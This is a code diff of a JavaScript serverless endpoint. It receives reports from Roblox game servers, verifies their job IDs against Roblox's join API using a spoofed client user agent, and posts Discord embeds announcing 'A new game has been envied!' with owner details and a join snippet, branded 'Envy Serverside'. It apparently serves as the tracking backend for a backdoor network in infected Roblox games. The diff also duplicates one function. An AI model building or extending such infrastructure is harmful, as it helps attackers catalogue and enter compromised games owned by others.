@@ -1,13 +1,11 @@
 import { Redis } from '@upstash/redis';
 
-
 async function cleanupStaleGames(redis, REAL_WEBHOOK_URL) {
     const STALE_GAME_SECONDS = 2 * 60 * 60; // Clean up if two hours passed without a game update.
     const currentTime = Math.floor(Date.now() / 1000);
     let deletedCount = 0;
     
     try {
-        
         const gameKeys = await redis.keys('game:*');
         if (gameKeys.length === 0) return;
     
@@ -30,6 +28,188 @@ async function cleanupStaleGames(redis, REAL_WEBHOOK_URL) {
         console.error("Background Cleanup Error:", error);
     }
 }
+
+async function fetchGameInfo(placeId) {
+    try {
+        // First, get universe ID from place ID
+        const universeResponse = await fetch(
+            `https://apis.roblox.com/universes/v1/places/${placeId}/universe`,
+            { headers: { 'User-Agent': 'Agent-E' } }
+        );
+        if (!universeResponse.ok) throw new Error('Failed to fetch universe ID');
+        const universeData = await universeResponse.json();
+        const universeId = universeData.universeId;
+
+        // Fetch game details
+        const gameResponse = await fetch(
+            `https://games.roblox.com/v1/games?universeIds=${universeId}`,
+            { headers: { 'User-Agent': 'Agent-E' } }
+        );
+        if (!gameResponse.ok) throw new Error('Failed to fetch game info');
+        const gameData = await gameResponse.json();
+        const gameInfo = gameData.data[0];
+
+        // Fetch thumbnail
+        let thumbnail = "https://tr.rbxcdn.com/31c19d85d08e6c3e7f20d88c614f06cb/512/512/Image/Png";
+        try {
+            const thumbResponse = await fetch(
+                `https://thumbnails.roblox.com/v1/games/icons?universeIds=${universeId}&size=512x512&format=Png`,
+                { headers: { 'User-Agent': 'Agent-E' } }
+            );
+            if (thumbResponse.ok) {
+                const thumbData = await thumbResponse.json();
+                if (thumbData.data && thumbData.data[0]) {
+                    thumbnail = thumbData.data[0].imageUrl;
+                }
+            }
+        } catch (e) {
+            console.error("Thumbnail fetch error:", e);
+        }
+
+        return { gameInfo, universeId, thumbnail };
+    } catch (error) {
+        console.error("Error fetching game info:", error);
+        throw error;
+    }
+}
+
+function formatNumber(n) {
+    n = parseInt(n);
+    if (isNaN(n)) return "Unknown";
+    return n >= 1e6 ? `${(n / 1e6).toFixed(1)}M`
+        : n >= 1e3 ? `${(n / 1e3).toFixed(1)}K`
+        : n.toString();
+}
+
+function formatDate(dateString) {
+    try {
+        const date = new Date(dateString);
+        const now = new Date();
+        const diffMs = now - date;
+        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
+        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
+        const diffMinutes = Math.floor(diffMs / (1000 * 60));
+
+        // Format absolute date
+        const month = String(date.getMonth() + 1).padStart(2, '0');
+        const day = String(date.getDate()).padStart(2, '0');
+        const year = date.getFullYear();
+        const absoluteDate = `${month}/${day}/${year}`;
+
+        // Format relative time
+        let relativeTime;
+        if (diffMinutes < 60) {
+            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
+        } else if (diffHours < 24) {
+            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
+        } else if (diffDays < 30) {
+            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
+        } else if (diffDays < 365) {
+            const months = Math.floor(diffDays / 30);
+            relativeTime = `${months} month${months !== 1 ? 's' : ''} ago`;
+        } else {
+            const years = Math.floor(diffDays / 365);
+            relativeTime = `${years} year${years !== 1 ? 's' : ''} ago`;
+        }
+
+        return `${relativeTime} (${absoluteDate})`;
+    } catch (e) {
+        return "Unknown";
+    }
+}
+
+function formatDate(dateString) {
+    try {
+        const date = new Date(dateString);
+        const now = new Date();
+        const diffMs = now - date;
+        const diffDays = Math.floor(diffMs / (1000 * 60 * 60 * 24));
+        const diffHours = Math.floor(diffMs / (1000 * 60 * 60));
+        const diffMinutes = Math.floor(diffMs / (1000 * 60));
+
+        // Format absolute date
+        const month = String(date.getMonth() + 1).padStart(2, '0');
+        const day = String(date.getDate()).padStart(2, '0');
+        const year = date.getFullYear();
+        const absoluteDate = `${month}/${day}/${year}`;
+
+        // Format relative time
+        let relativeTime;
+        if (diffMinutes < 60) {
+            relativeTime = `${diffMinutes} minute${diffMinutes !== 1 ? 's' : ''} ago`;
+        } else if (diffHours < 24) {
+            relativeTime = `${diffHours} hour${diffHours !== 1 ? 's' : ''} ago`;
+        } else if (diffDays < 30) {
+            relativeTime = `${diffDays} day${diffDays !== 1 ? 's' : ''} ago`;
+        } else if (diffDays < 365) {
+            const months = Math.floor(diffDays / 30);
+            relativeTime = `${months} month${months !== 1 ? 's' : ''} ago`;
+        } else {
+            const years = Math.floor(diffDays / 365);
+            relativeTime = `${years} year${years !== 1 ? 's' : ''} ago`;
+        }
+
+        return `${relativeTime} (${absoluteDate})`;
+    } catch (e) {
+        return "Unknown";
+    }
+}
+
+function createDiscordEmbed(gameInfo, placeId, playerCount, thumbnail) {
+    let creator = "";
+    if (gameInfo.creator.type === "User") {
+        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/users/${gameInfo.creator.id || 0}/profile)\n` +
+                  `**ID**: \`${gameInfo.creator.id}\`\n` +
+                  `**Verified**: \`${gameInfo.creator.hasVerifiedBadge}\``;
+    } else {
+        creator = `**Owner**: [${gameInfo.creator.name}](https://www.roblox.com/communities/${gameInfo.creator.id || 0})`;
+    }
+
+    return {
+        content: "",
+        username: "Envy Messenger",
+        avatar_url: "https://i.ibb.co/TMQbDpH8/image.png",
+        embeds: [{
+            title: gameInfo.name,
+            url: `https://www.roblox.com/games/${placeId}`,
+            color: parseInt("0x8200c8", 16),
+            author: {
+                name: "A new game has been envied!",
+                icon_url: "https://i.ibb.co/TMQbDpH8/image.png"
+            },
+            thumbnail: { url: thumbnail },
+            fields: [
+                {
+                    name: "> **Game Information**",
+                    value: `**Players**: \`${gameInfo.playing}\`\n` +
+                           `**Server Size**: \`${gameInfo.maxPlayers || playerCount || "Unknown"}\`\n` +
+                           `**Visits**: \`${formatNumber(gameInfo.visits)}\`\n` +
+                           `**Favorites**: \`${formatNumber(gameInfo.favoritedCount)}\`\n` +
+                           `**Genre**: \`${gameInfo.genre}\`\n` +
+                           `**Description**: ${gameInfo.description || "No description"}\n` +
+                           `**Last Game Update**: \`${formatDate(gameInfo.updated)}\``,
+                    inline: true
+                },
+                {
+                    name: "> **Owner Information**",
+                    value: creator,
+                    inline: true
+                },
+                {
+                    name: "**Javascript Join Code**",
+                    value: `\`\`\`js\nRoblox.GameLauncher.joinGameInstance(${placeId}, "")\n\`\`\``,
+                    inline: false
+                }
+            ],
+            footer: {
+                icon_url: "https://i.ibb.co/TMQbDpH8/image.png",
+                text: "Envy Serverside"
+            },
+            timestamp: new Date().toISOString()
+        }]
+    };
+}
+
 export default async function handler(req, res) {
     const redis = new Redis({ 
         url: process.env.KV_REST_API_URL,
@@ -39,47 +219,57 @@ export default async function handler(req, res) {
     const SECRET_HEADER = process.env.SECRET_HEADER_KEY;
     const AUTH_CACHE_EXPIRATION_SECONDS = 300; // 5 minutes
     
-    
-    
     if (req.method !== 'POST') return res.status(405).send('Method Not Allowed.');
     if (req.headers['x-secret-header'] !== SECRET_HEADER) return res.status(401).send('Unauthorized');
 
+    // Extract Place ID from Roblox-Id header
+    const robloxIdHeader = req.headers['roblox-id'];
+    if (!robloxIdHeader) {
+        return res.status(400).send('Bad Request: Missing Roblox-Id header.');
+    }
+
+    // Parse Place ID from header (format might be "placeId=123456" or just "123456")
+    let placeId;
+    const placeIdMatch = robloxIdHeader.match(/placeId=(\d+)/);
+    if (placeIdMatch) {
+        placeId = placeIdMatch[1];
+    } else if (/^\d+$/.test(robloxIdHeader)) {
+        placeId = robloxIdHeader;
+    } else {
+        return res.status(400).send('Bad Request: Invalid Roblox-Id header format.');
+    }
+
+    const { jobId, playerCount } = req.body;
+    if (!jobId) {
+        return res.status(400).send('Bad Request: Missing jobId.');
+    }
+
+    // Verify JobId authenticity
     async function isJobIdAuthentic(placeId, targetJobId) {
         const apiUrl = 'https://gamejoin.roblox.com/v1/join-game-instance';
         try {
-            
             const apiResponse = await fetch(apiUrl, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-                'User-Agent': 'Roblox/WinInet' // Use a standard Roblox user agent
-            },
-            body: JSON.stringify({
-                placeId: placeId,
-                gameId: targetJobId
-            })
-        });
-        // A successful lookup, even if it returns an error meant for a client (like "Join_Error"),
-        // usually means the server exists. A hard 400 or 500 often means it doesn't.
-        // We'll consider any non-500/404 response as potentially valid for this check.
-        return apiResponse.status < 500;
-    
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'User-Agent': 'Roblox/WinInet'
+                },
+                body: JSON.stringify({
+                    placeId: placeId,
+                    gameId: targetJobId
+                })
+            });
+            return apiResponse.status < 500;
         } catch (error) {
             console.error("Error during JobId authentication:", error);
-            return false; // Fail safely on any exception
+            return false;
         }
-    }
-
-    const { gameId, placeId, jobId, payload } = req.body;
-    if (!gameId || !placeId || !jobId) {
-        return res.status(400).send('Bad Request: Missing required IDs.');
     }
 
     const authCacheKey = `auth:${jobId}`;
     const isAlreadyAuthenticated = await redis.get(authCacheKey);
 
     if (!isAlreadyAuthenticated) {
-        // If not in cache, perform the expensive check
         console.log(`JobId ${jobId} not in cache. Performing live authentication...`);
         const isAuthentic = await isJobIdAuthentic(placeId, jobId);
 
@@ -87,46 +277,55 @@ export default async function handler(req, res) {
             console.warn(`Rejected unauthenticated JobId: ${jobId}`);
             return res.status(403).send('Forbidden: JobId authentication failed.');
         }
-        // If authentic, save to cache with a 5-minute expiration
         await redis.set(authCacheKey, 'true', { ex: AUTH_CACHE_EXPIRATION_SECONDS });
     }
 
-    // Rate limit every request, even cached ones
+    // Rate limiting
     const rateLimitKey = `rate:${jobId}`;
     const currentRequests = await redis.incr(rateLimitKey);
     if (currentRequests === 1) await redis.expire(rateLimitKey, 60);
     if (currentRequests > 20) return res.status(429).send('Too Many Requests');
 
-   
     try {
-        const gameKey = `game:${gameId}`;
+        // Fetch game information from Roblox APIs
+        const { gameInfo, universeId, thumbnail } = await fetchGameInfo(placeId);
+        
+        const gameKey = `game:${universeId}`;
         let gameData = await redis.get(gameKey);
         let messageId = gameData ? gameData.messageId : null;
         const currentTime = Math.floor(Date.now() / 1000);
 
-        
+        // Create Discord embed
+        const payload = createDiscordEmbed(gameInfo, placeId, playerCount, thumbnail);
         
         const headers = { 'Content-Type': 'application/json', 'User-Agent': 'Agent-E' };
 
         if (!messageId) {
             const createUrl = `${REAL_WEBHOOK_URL}?wait=true`;
-            const createResponse = await fetch(createUrl, { method: 'POST', headers, body: JSON.stringify(payload) });
+            const createResponse = await fetch(createUrl, { 
+                method: 'POST', 
+                headers, 
+                body: JSON.stringify(payload) 
+            });
             if (!createResponse.ok) throw new Error(`Discord API Error on POST: ${createResponse.status}`);
             const responseData = await createResponse.json();
             messageId = responseData.id;
         } else {
             const editUrl = `${REAL_WEBHOOK_URL}/messages/${messageId}`;
-            await fetch(editUrl, { method: 'PATCH', headers, body: JSON.stringify(payload) });
+            await fetch(editUrl, { 
+                method: 'PATCH', 
+                headers, 
+                body: JSON.stringify(payload) 
+            });
         }
         
-        const newGameData = { messageId: messageId, timestamp: currentTime };
+        const newGameData = { messageId: messageId, timestamp: currentTime, placeId: placeId };
         await redis.set(gameKey, newGameData);
         
-        res.status(200).json({ messageId: messageId });
+        res.status(200).json({ success: true });
         cleanupStaleGames(redis, REAL_WEBHOOK_URL);
     } catch (error) {
         console.error("Main Handler Error:", error);
-        // Check if a response has already been sent before sending another one
         if (!res.headersSent) {
             return res.status(500).send(`Internal Server Error: ${error.message}`);
         }
